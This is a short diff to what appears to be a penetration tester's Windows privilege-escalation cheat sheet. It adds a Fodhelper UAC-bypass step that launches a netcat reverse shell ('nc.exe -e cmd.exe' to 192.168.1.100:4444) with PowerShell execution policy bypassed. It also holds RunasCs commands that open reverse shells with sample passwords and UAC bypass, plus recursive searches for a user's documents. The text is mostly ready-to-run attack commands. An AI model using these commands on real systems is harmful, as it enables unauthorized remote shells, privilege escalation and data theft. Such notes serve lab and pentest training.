@@ -1214,6 +1214,15 @@ Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction Si
 Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
 
+https://github.com/gushmazuko/WinBypass/blob/master/FodhelperBypass.ps1
+
+# MODIFY THIS LINE with your IP and port
+$program = "C:\Windows\Temp\nc.exe -e cmd.exe 192.168.1.100 4444"
+
+# Modify $program in the script to point to your nc.exe reverse shell
+# Then run:
+powershell -ep bypass .\FodhelperBypass.ps1
+
 .\RunasCs.exe <username> <password> cmd.exe -r <kali_ip>:<port>
 .\RunasCs.exe administrator admin@123 cmd.exe -r 192.168.1.1:1111
 .\RunasCs.exe admin admin@123 cmd.exe -r 192.168.1.1:1111 --bypass-uac
